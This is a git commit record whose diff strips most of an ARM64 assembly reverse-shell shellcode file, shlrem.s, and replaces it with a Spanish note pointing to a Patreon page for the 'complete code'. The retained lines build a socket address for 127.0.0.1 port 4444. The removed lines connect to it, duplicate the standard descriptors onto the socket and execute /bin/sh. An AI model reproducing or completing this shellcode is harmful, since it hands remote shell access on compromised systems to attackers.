8f7328f7027c5af2756b94ba7c6223eca73fe2c3
Pavel Anguiano <50802374+BGPavelAng@users.noreply.github.com>
2021-11-25 19:46:03 -0600

    Update shlrem.s

--- shlrem.s
+++ shlrem.s
@@ -27,27 +27,6 @@ movk x1, 0x5c11, lsl 16
 movk x1, 0x007f, lsl 32
 movk x1, 0x0001, lsl 48
 
-str x1, [sp, -16]!
-mov x1, sp
-svc 0
-
-mov x8, 24
-mov x1, 3
-
-jp_dup:
-mov x2, xzr
-mov w0, w3
-subs x1, x1, 1
-svc 0
-bne jp_dup
-
-mov x8, 221
-movz x0, 0x622f
-movk x0, 0x6e69, lsl 16
-movk x0, 0x732f, lsl 32
-movk x0, 0x0068, lsl 48
-str x0, [sp]
-mov x0, sp
-
-svc 0
-
+Código completo.
+https://www.patreon.com/BGPavelAng
+Ayudame a seguir haciendo más de esto.
